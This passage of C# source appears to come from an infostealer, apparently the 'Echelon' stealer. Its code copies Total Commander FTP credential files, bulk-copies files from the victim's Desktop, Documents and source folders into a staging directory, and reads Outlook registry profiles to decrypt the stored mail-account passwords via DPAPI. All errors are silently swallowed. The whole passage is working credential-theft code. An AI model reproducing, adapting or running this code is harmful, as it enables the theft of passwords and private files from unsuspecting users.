                for (int i = 0; i < files.Length; i++)
                {
                    if (files[i].Name.Contains("wcx_ftp.ini"))
                    {

                        File.Copy(text2 + "wcx_ftp.ini", Echelon_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
                        count++;
                    }
                }
            }
            catch { }
        }
    }

    public partial class GetFiles
    {
        public class Folders : IFolders
        {
            public string Source { get; private set; }
            public string Target { get; private set; }

            public Folders(string source, string target)
            {
                Source = source;
                Target = target;
            }
        }
    }

    public partial class GetFiles
    {
        public static int count = 0;
        public static void Inizialize(string Echelon_Dir)
        {
            try
            {
                string Files = Echelon_Dir + "\\Files";
                Directory.CreateDirectory(Files);
                if (!Directory.Exists(Files))
                {
                    Inizialize(Files);
                }
                else
                {
                    // 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
                    CopyDirectory(Help.DesktopPath, Files, "*.*", Program.FileSize);
                    CopyDirectory(Help.MyDocuments, Files, "*.*", Program.FileSize);
                    CopyDirectory(Help.UserProfile + "\\source", Files, "*.*", Program.FileSize);

                    // CopyDirectory("[From]"], "[To]", "*.*", "[Limit]");   
                }
            }
            catch { }
        }
        private static long GetDirSize(string path, long size = 0)
        {
            try
            {
                foreach (string file in Directory.EnumerateFiles(path))
                {
                    try
                    {
                        size += new FileInfo(file).Length;

                    }
                    catch { }
                }
                foreach (string dir in Directory.EnumerateDirectories(path))
                {
                    try
                    {
                        size += GetDirSize(dir);
                    }
                    catch { }
                }
            }
            catch { }
            return size;
        }

        public static void CopyDirectory(string source, string target, string pattern, long maxSize)
        {
            var stack = new Stack<Folders>();
            stack.Push(new Folders(source, target));
            long size = GetDirSize(target);
            while (stack.Count > 0)

            {
                Folders folders = stack.Pop();
                try
                {
                    Directory.CreateDirectory(folders.Target);
                    foreach (string file in Directory.EnumerateFiles(folders.Source, pattern))
                    {
                        try
                        {
                            if (Array.IndexOf(Program.Echelon_Size, Path.GetExtension(file).ToLower()) < 0)
                            {
                                continue;
                            }
                            string targetPath = Path.Combine(folders.Target, Path.GetFileName(file));
                            if (new FileInfo(file).Length / 0x400 < 0x1388) // 1024 < 5000
                            {
                                File.Copy(file, targetPath);
                                size += new FileInfo(targetPath).Length;
                                if (size > maxSize)
                                {
                                    return;
                                }
                                count++;
                            }
                        }
                        catch { }
                    }
                }
                catch (UnauthorizedAccessException) { continue; }
                catch (PathTooLongException) { continue; }
                try
                {
                    foreach (string folder in Directory.EnumerateDirectories(folders.Source))
                    {
                        try
                        {
                            if (!folder.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
                            {
                                stack.Push(new Folders(folder, Path.Combine(folders.Target, Path.GetFileName(folder))));
                            }
                        }
                        catch { }
                    }
                }
                catch (UnauthorizedAccessException) { continue; }
                catch (DirectoryNotFoundException) { continue; }
                catch (PathTooLongException) { continue; }
            }
            stack.Clear();
        }
    }

    public interface IFolders
    {
        string Source { get; }
        string Target { get; }
    }

    class Outlook
    {
        public static string OutlookDir = "\\EmailClients\\Outlook";
        public static void GrabOutlook(string Echelon_Dir)
        {
            string data = "";

            string[] RegDirecories = new string[]
                {
                "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
                };

            string[] mailClients = new string[]
{
                "SMTP Email Address","SMTP Server","POP3 Server",
                "POP3 User Name","SMTP User Name","NNTP Email Address",
                "NNTP User Name","NNTP Server","IMAP Server","IMAP User Name",
                "Email","HTTP User","HTTP Server URL","POP3 User",
                "IMAP User", "HTTPMail User Name","HTTPMail Server",
                "SMTP User","POP3 Password2","IMAP Password2",
                "NNTP Password2","HTTPMail Password2","SMTP Password2",
                "POP3 Password","IMAP Password","NNTP Password",
                "HTTPMail Password","SMTP Password"
};

            foreach (string dir in RegDirecories)
            {
                data += $"{Get(dir, mailClients)}";
            }

            try
            {
                Directory.CreateDirectory(Echelon_Dir + OutlookDir);
                File.WriteAllText(Echelon_Dir + OutlookDir + "\\Outlook.txt", data + "\r\n");
            }
            catch { }
        }

        static string Get(string path, string[] clients)
        {
            Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");
            Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");

            string data = "";

            try
            {
                foreach (string client in clients)
                {
                    try
                    {
                        object value = GetInfoFromReg(path, client);

                        if (value != null && client.Contains("Password") && !client.Contains("2"))
                        {
                            data += $"{client}: {Decrypt((byte[])value)}\r\n";
                        }

                        else
                        {
                            if (smptClient.IsMatch(value.ToString()) || mailClient.IsMatch(value.ToString()))
                            {
                                data += $"{client}: {value}\r\n";
                            }

                            else
                            {
                                data += $"{client}: {Encoding.UTF8.GetString((byte[])value).Replace(Convert.ToChar(0).ToString(), "")}\r\n";
                            }
                        }
                    }
                    catch
                    {
                    }
                }

                //
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(path, false);
                string[] Clients = key.GetSubKeyNames();

                foreach (string client in Clients)
                {
                    data += $"{Get($"{path}\\{client}", clients)}";
                }
            }
            catch
            {

            }


            return data;
        }

        public static object GetInfoFromReg(string path, string valueName)
        {
            object value = null;

            try
            {
                Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(path, false);
                value = registryKey.GetValue(valueName);
                registryKey.Close();
            }
            catch
            { }

            return value;
        }

        public static string Decrypt(byte[] encrypted)
        {
            try
            {
                byte[] decoded = new byte[encrypted.Length - 1];
                Buffer.BlockCopy(encrypted, 1, decoded, 0, encrypted.Length - 1);

                return Encoding.UTF8.GetString(System.Security.Cryptography.ProtectedData.Unprotect(decoded, null, System.Security.Cryptography.DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");

            }
            catch
            { }

            return "null";
        }
    }
}
